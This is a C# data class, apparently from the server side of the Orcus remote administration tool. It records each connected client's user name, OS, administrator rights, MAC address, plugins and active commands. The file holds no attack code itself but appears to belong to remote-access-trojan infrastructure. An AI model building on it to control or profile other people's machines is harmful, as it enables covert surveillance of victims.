using System.Collections.Generic;
using System.Linq;
using System.Text;
using Orcus.Shared.Client;
using Orcus.Shared.Connection;

namespace Orcus.Server.Core.ClientAcceptor
{
    public class CoreClientInformation
    {
        public string UserName { get; set; }
        public string OSName { get; set; }
        public OSType OSType { get; set; }
        public string Language { get; set; }
        public bool IsAdministrator { get; set; }
        public bool IsServiceRunning { get; set; }
        public List<PluginInfo> Plugins { get; set; }
        public List<LoadablePlugin> LoadablePlugins { get; set; }
        public ClientConfig ClientConfig { get; set; }
        public int ClientVersion { get; set; }
        public string ClientPath { get; set; }
        public int ApiVersion { get; set; }
        public double FrameworkVersion { get; set; }
        public byte[] MacAddress { get; set; }
        public List<int> ActiveCommands { get; set; }

        public override string ToString()
        {
            return
                typeof(CoreClientInformation).GetProperties()
                    .Aggregate(new StringBuilder(), (builder, property) => builder.AppendLine(
                        $"{property.Name} ({property.PropertyType.Name}) = {property.GetValue(this)}")).ToString();
        }
    }
}